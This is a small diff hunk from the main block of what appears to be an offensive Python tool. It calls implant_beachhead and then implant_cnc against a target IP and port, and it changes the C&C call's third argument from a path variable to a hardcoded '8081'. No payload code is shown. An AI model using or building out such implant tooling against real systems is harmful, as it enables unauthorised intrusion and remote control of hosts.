@@ -36,6 +36,6 @@ if __name__ == '__main__':
 
     implant_beachhead(args.ip, args.port, args.path)
     time.sleep(5)
-    
-    implant_cnc(args.ip, args.port, args.path, args.implant)
+
+    implant_cnc(args.ip, args.port, "8081", args.implant)
     
